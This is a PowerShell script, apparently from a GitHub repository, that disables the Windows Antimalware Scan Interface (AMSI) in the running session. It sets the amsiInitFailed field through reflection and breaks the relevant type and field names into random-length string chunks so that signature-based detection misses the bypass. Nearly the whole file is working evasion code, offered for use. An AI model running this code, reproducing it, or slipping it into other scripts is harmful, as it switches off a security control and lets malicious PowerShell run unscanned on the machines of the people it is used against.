<#
    Filename: Invoke-AmsiExec.ps1
    Purpose: The functions in this script are used to break the signature being utilized to catch
    attempted Amsi bypass. The signature currently works by searching for the string values being
    entered in the functions for Amsi followed by some key words. Based on this, we can say that
    if we break that string into chunks that are reassembled in the function call we should Bypass
    that signature detection.
    Author: Jake Homberg
    Link: www.github.com/jakehomb/
#>

function Invoke-AmsiExec{
  <#
  .SYNOPSIS
  Invoke-AMSIExec uses the Invoke-ChunkString function to create random "Signatures" needed to call
  the code to disable AMSI on the powershell instance.

  .DESCRIPTION
  This function takes the values required for the usual AMSI bypass and uses a chunking function to
  create arrays of strings of different sizes. Because these strings are of different lengths and are
  determined at runtime, we have a decent chance of signature bypass.

  .OUTPUTS
  This function does not provide any outputs.

  .EXAMPLE
  Invoke-AMSIExec

  .LINK
  https://github.com/jakehomb/AMSI-Bypass
  #>

  # The AsmType and FieldParam variables containing the strings we will be 'chunking'

  # Here we call the Invoke-ChunkString function to get arrays containing the string broken into subsets

  # Run the AMSI Bypass method shown by Matt Graeber. We take the array that we created above and join them
  # on '' to form the original strings.


  $AsmType = "System.Management.Automation." + 'A' + 'm' + 's' + 'i' + "Utils"
  $FieldParam1 = 'a' + 'm' + 's' + 'i' + 'InitFailed'
  $FieldParam2 = 'NonPublic,Static'

  $AsmTypeArr = Invoke-ChunkString $AsmType
  $FieldParam1Arr = Invoke-ChunkString $FieldParam1
  $FieldParam2Arr = Invoke-ChunkString $FieldParam2

  iex "[Ref].Assembly.GetType('$($AsmTypeArr -join "' + '")').GetField('$($FieldParam1Arr -join "' + '")', '$($FieldParam2Arr -join "' + '")').SetValue(`$null,`$true)"
}


function Invoke-ChunkString{
  <#
  .SYNOPSIS
  Returns the array of chunked strings from the input string.

  .DESCRIPTION
  This function takes in a string and breaks it down into smaller chunks. If given an integer as a second value, it will

  .OUTPUTS
  This function returns an array of stirngs.

  .EXAMPLE
  $Invoke-ChunkString "Some string"
  $Invoke-ChunkString $StringVar

  .LINK
  https://github.com/jakehomb/AMSI-Bypass
  #>

  [OutputType([String])]
  # The string to be chunked is taken in as a parameter.
  param(
    [parameter(Mandatory=$true)]
    [string]$toChunk,
    [int] $chunkSize = 6
  )

  # Set up the array we will be returning.
  $RetArr = @()

  # Create our index. This will be a component of the conditions for the while loop below.
  $index = 0

  Do {
    # Reset the values for maxChunkLength and nextRand
    $maxChunkLength = 0
    $nextRand = 0

    # If/Else blocks to be used to check bounds.
    if (($index + $chunkSize) -lt $toChunk.length ){
      $maxChunkLength = $chunkSize
      $nextRand = Get-Random -Minimum 1 -Maximum $maxChunkLength
    } else {
      $maxChunkLength = $toChunk.length - $index
      $nextRand = $maxChunkLength
    }

    # Add the chunk to the return array
    $RetArr+= $toChunk.substring($index, $nextRand)

    # Set the index so it can continue on to the next iteration of the loop.
    $index = $index + $nextRand
  } While ( $index -lt $toChunk.length)

  # Once the while loop has completed, the array is returned to the caller
  return $RetArr
}
